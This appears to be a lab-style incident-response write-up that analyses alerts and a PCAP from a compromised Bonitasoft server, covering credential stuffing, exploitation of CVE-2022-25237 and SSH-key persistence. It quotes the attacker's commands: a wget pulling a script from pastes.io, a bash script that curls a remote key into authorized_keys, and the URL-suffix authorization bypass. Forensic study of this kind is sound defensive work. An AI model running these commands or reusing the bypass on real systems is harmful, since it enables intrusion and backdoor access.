### Scenario
As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren't the most security aware. As our new security provider we'd like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.

### Artifacts
+ `meerkat-alerts.json:md5sum:f9642326d526c4f5159470b1c5d89b4a`: A SIEM alerts log file in JSON format.
+ `meerkat.pcap:md5sum:7ac62b1e835e0850104f1fc2ecf1f002`: A PCAP file.

### Tools Used
+ `jq` JSON parser - Analyzing the JSON file.
+ WireShark - Analyzing the PCAP file.

### Forensic Analysis

**Using `jq` I quickly searched for alerts with severity level 1.**
```json
$ cat meerkat-alerts.json| jq '.[] | select(.alert.severity==1)' | less

Looks like a TA was brute forcing the default credentials for Bonitasoft to exploit the CVE-2022-25237. I confirmed the credential stuffing attack by analyzing the PCAP file.

**PCAP Analysis Using WireShark**
![[Pasted image 20240612174728.png]]

Analyzing the PCAP file it was confirmed that the TA successfully gained access to an account with the credential `seb.broom@forela.co.uk:g0vernm3nt`. And then gained privileged access to the Web Application's REST API by exploiting CVE-2022-25237. After getting privileged access to the Bonita web service the TA uploaded a malicious API extension to get command execution on the web application server.

The TA successfully gained command execution on the server.

**CVE-2022-25237**
According to [NIST](https://nvd.nist.gov/vuln/detail/CVE-2022-25237), *Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions.*

HTTP Object Extraction:
![[Pasted image 20240612180604.png]]

After discovering this incident I extracted all the HTTP TCP stream objects from the PCAP file and found the usernames and passwords combination list used in this security incident.

I also found an interesting file named `bx5gcr0et8`.
```json
{"p":"0","c":"1","cmd":"wget https://pastes.io/raw/bx5gcr0et8","out":"--2023-01-19 15:38:52--  https://pastes.io/raw/bx5gcr0et8\nResolving pastes.io (pastes.io)... 66.29.132.145\nConnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 113 [text/plain]\nSaving to: \u2018bx5gcr0et8\u2019\n\n     0K                                                       100% 57.8M=0s\n\n2023-01-19 15:38:53 (57.8 MB/s) - \u2018bx5gcr0et8\u2019 saved [113/113]\n\n","currentDate":"2023-01-19"}
```

A command was issued to download the file from `pastes.io`.
![[Pasted image 20240612181638.png]]

And then another command was issued to run the `bx5gcr0et8` file which was a bash script.
![[Pasted image 20240612181813.png]]

The contents of the bash script `bx5gcr0et8`:
```bash
**#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart**
```

A persistence technique identified by MITRE with a technique ID [T1098.004](https://attack.mitre.org/techniques/T1098/004/). Basically, the adversary used a public key and inserted in into the `/home/ubuntu/.ssh/authorized_keys` file. This technique needs the derivative `PubkeyAuthentication` set to `yes` in the `/etc/ssh/sshd_config` file. And, also the TA can modify the `sshd_config` file further and set the `RSAAuthentication` to the value `yes`, if the public key algorithm is RSA based.

The Public Key used by the TA:
```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgruRMq3DMroGXrcPeeuEqQq3iS/sAL3gryt+nUqbBA/M+KG4ElCvJS4gP2os1b8FMk3ZwvrVTdpEKW6wdGqPl2wxznBjOBstx6OF2yp9RIOb3c/ezgs9zvnaO07YC8Sm4nkkXHgkabqcM7rHEY4Lay0LWF9UbxueSAHIJgQ2ADbKSnlg0gMnJTNRwKbqesk0ZcG3b6icj6nkKykezBLvWc7z4mkSm28ZVTa15W3HUWSEWRbGgJ6eMBdi7WnWXZ92SYDq0XUBV2Sx2gjoDGHwcd6I0q9BU52wWYo3L3LaPEoTcLuA+hnn82086oUzJfmEUtWGlPAXfJBN7vRIMSvsN
```


### Summary
The threat actors used credential stuffing attack against the Bonita Service and escalated their privileges in the web application by exploiting CVE-2022-25237. After that to get remote code execution on the server the threat actors uploaded a malicious extension file which gave them command injection ability. Then, they used this ability to get information of the users and added a SSH backdoor to the `ubuntu` user account for persistence.
